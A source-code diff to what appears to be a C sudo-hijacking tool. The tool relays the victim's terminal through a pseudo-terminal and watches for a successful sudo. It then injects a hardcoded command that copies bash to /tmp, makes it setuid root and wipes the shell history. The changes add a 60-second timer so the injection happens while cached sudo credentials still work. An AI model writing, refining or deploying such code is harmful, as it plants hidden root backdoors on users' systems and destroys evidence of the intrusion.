@@ -18,6 +18,7 @@
 #include <unistd.h>
 
 #include <sys/ioctl.h>
+#include <sys/time.h>
 #include <sys/types.h>
 #include <sys/select.h>
 
@@ -30,6 +31,7 @@
 struct termios termios;
 
 static char *command = ";sudo cp -rp /bin/bash /tmp;sudo chmod +s /tmp/bash;echo -n > ~/.bash_history;history -c;\x0d";
+static long sudo_timeout = 60 * 1000000; // 60s
 
 static void fini(void)
 {
@@ -80,6 +82,10 @@ int main(int argc, char* argv[])
     int count = 0;
 
     ssize_t command_length = strlen(command);
+
+    struct timeval start = { .tv_sec = 0, .tv_usec = 0 };
+    struct timeval end = { .tv_sec = 0, .tv_usec = 0 };
+    long sudo_time = 0;
 
 
     ret = tcgetattr(STDIN_FILENO, &termios);
@@ -273,6 +279,29 @@ int main(int argc, char* argv[])
                 exit(0);
             }
 
+            if(sudo_success_flag == 1){
+                if(gettimeofday(&end, NULL) == -1){
+#ifdef _DEBUG
+                    printf("[E] [parent] gettimeofday error\n");
+#endif
+                    close(master_fd);
+                    exit(0);
+                }
+
+                sudo_time = (end.tv_sec - start.tv_sec) * 1000000 + (end.tv_usec - start.tv_usec);  // microsecond
+                if(sudo_time >= sudo_timeout){
+                    sudo_flag = 0;
+                    sudo_password_flag = 0;
+                    sudo_success_flag = 0;
+
+                    sudo_time = 0;
+                    start.tv_sec = 0;
+                    start.tv_usec = 0;
+                    end.tv_sec = 0;
+                    end.tv_usec = 0;
+                }
+            }
+
             if(FD_ISSET(STDIN_FILENO, &in_fds)){
                 memset(buffer, 0, BUFFER_SIZE);
                 read_count = read(STDIN_FILENO, buffer, BUFFER_SIZE);
@@ -445,6 +474,15 @@ int main(int argc, char* argv[])
 #ifdef _DEBUG
                             printf("[I] [parent] sudo command succeeded\n");
 #endif
+
+                            if(gettimeofday(&start, NULL) == -1){
+#ifdef _DEBUG
+                                printf("[E] [parent] gettimeofday error\n");
+#endif
+                                close(master_fd);
+                                exit(0);
+                            }
+
                             sudo_flag = 0;
                             sudo_password_flag = 0;
                             sudo_success_flag = 1;
